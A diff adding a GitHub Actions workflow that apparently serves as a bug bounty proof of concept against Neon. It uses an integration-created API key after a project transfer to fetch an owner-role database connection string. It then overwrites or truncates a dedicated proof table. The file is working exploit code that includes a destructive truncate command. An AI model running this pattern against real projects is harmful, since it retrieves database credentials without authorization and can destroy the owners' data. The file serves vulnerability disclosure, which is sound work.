@@ -1,0 +1,65 @@
+name: Neon post-transfer authority proof
+
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: Safe controlled proof phase
+        required: true
+        default: write
+        type: choice
+        options:
+          - write
+          - truncate
+
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    env:
+      NEON_API_KEY: ${{ secrets.NEON_API_KEY }}
+      NEON_PROJECT_ID: ${{ vars.NEON_PROJECT_ID }}
+      PROOF_MODE: ${{ inputs.mode }}
+    steps:
+      - name: Use the integration-created key after project transfer
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          project_json="$(curl --fail-with-body --silent --show-error \
+            --url "https://console.neon.tech/api/v2/projects/${NEON_PROJECT_ID}" \
+            --header "Authorization: Bearer ${NEON_API_KEY}" \
+            --header "X-Bug-Bounty: ryan@arcanum-sec.com")"
+          branch_id="$(printf '%s' "${project_json}" | jq -r '.project.default_branch_id // .default_branch_id')"
+          test -n "${branch_id}"
+          test "${branch_id}" != "null"
+
+          uri_json="$(curl --fail-with-body --silent --show-error --get \
+            --url "https://console.neon.tech/api/v2/projects/${NEON_PROJECT_ID}/connection_uri" \
+            --header "Authorization: Bearer ${NEON_API_KEY}" \
+            --header "X-Bug-Bounty: ryan@arcanum-sec.com" \
+            --data-urlencode "branch_id=${branch_id}" \
+            --data-urlencode "database_name=neondb" \
+            --data-urlencode "role_name=neondb_owner" \
+            --data-urlencode "pooled=false")"
+          database_url="$(printf '%s' "${uri_json}" | jq -r '.uri // .connection_uri')"
+          test -n "${database_url}"
+          test "${database_url}" != "null"
+
+          before="$(psql "${database_url}" -v ON_ERROR_STOP=1 -Atc 'select marker from public.bb_github_transfer_proof where id=1')"
+          echo "BB_BEFORE_SHA256=$(printf '%s' "${before}" | sha256sum | cut -d' ' -f1)"
+          echo "BB_DATABASE_USER=$(psql "${database_url}" -v ON_ERROR_STOP=1 -Atc 'select current_user')"
+
+          if [ "${PROOF_MODE}" = "write" ]; then
+            replacement="github-source-controlled-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"
+            psql "${database_url}" -v ON_ERROR_STOP=1 \
+              -v replacement="${replacement}" \
+              -c "update public.bb_github_transfer_proof set marker=:'replacement' where id=1"
+            after="$(psql "${database_url}" -v ON_ERROR_STOP=1 -Atc 'select marker from public.bb_github_transfer_proof where id=1')"
+            echo "BB_AFTER_WRITE_SHA256=$(printf '%s' "${after}" | sha256sum | cut -d' ' -f1)"
+          elif [ "${PROOF_MODE}" = "truncate" ]; then
+            psql "${database_url}" -v ON_ERROR_STOP=1 -c 'truncate table public.bb_github_transfer_proof'
+            echo "BB_AFTER_TRUNCATE_COUNT=$(psql "${database_url}" -v ON_ERROR_STOP=1 -Atc 'select count(*) from public.bb_github_transfer_proof')"
+          else
+            echo "unsupported proof mode" >&2
+            exit 2
+          fi
